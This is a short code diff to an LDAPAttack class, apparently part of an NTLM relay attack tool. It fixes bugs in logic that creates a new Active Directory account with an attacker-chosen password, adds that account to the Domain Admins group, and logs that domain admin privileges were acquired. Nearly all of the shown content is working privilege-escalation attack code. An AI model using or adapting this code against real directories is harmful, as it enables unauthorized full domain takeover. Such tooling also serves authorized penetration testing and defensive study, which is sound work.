@@ -143,6 +143,7 @@ class LDAPAttack(Thread):
 
         #Import it here because non-standard dependency
         self.ldapdomaindump = __import__('ldapdomaindump')
+        self.ldap3 = __import__('ldap3')
         self.client = LDAPClient
         self.username = username.split('/')[1]
 
@@ -170,7 +171,7 @@ class LDAPAttack(Thread):
             'displayName': newUser,
             'name': newUser,
             'userAccountControl': 512,
-            'accountExpires': 0,
+            'accountExpires': '0',
             'sAMAccountName': newUser,
             'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
@@ -184,7 +185,7 @@ class LDAPAttack(Thread):
         domainsid = domainDumper.getRootSid()
         dagroupdn = domainDumper.getDAGroupDN(domainsid)
         res = self.client.modify(dagroupdn, {
-            'member': [(self.client.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
+            'member': [(self.ldap3.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
         if res:
             logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
             logging.info('Domain Admin privileges aquired, shutting down...')
